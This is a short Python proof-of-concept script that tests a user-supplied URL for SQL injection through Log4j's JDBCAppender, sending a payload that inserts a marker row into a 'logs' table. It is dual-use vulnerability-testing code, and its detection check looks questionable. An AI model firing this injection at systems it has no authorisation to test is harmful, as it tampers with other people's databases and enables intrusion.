import requests
import argparse

def check_vulnerability(url, payload):
    try:
        print("[*] Sending payload...")
        params = {'param': payload}
        response = requests.get(url, params=params)

        if response.status_code == 200 and "SSL_PROJECT_LOLOLOLOLOLOLO" in response.text:
            print("[+] Payload executed successfully.")
            return True
        else:
            print("[-] Payload execution failed or not vulnerable.")
            return False
    except Exception as e:
        print(f"[-] Error occurred: {e}")
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Log4j JDBCAppender SQL injection test.")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., 'http://localhost:8080/').")
    args = parser.parse_args()

    payload = "');insert into logs values('SSL_PROJECT_LOLOLOLOLOLOLO"

    print("[*] Testing for vulnerability...")
    if check_vulnerability(args.url, payload):
        print("Detected Vulnerability : True")
    else:
        print("Detected Vulnerability : False")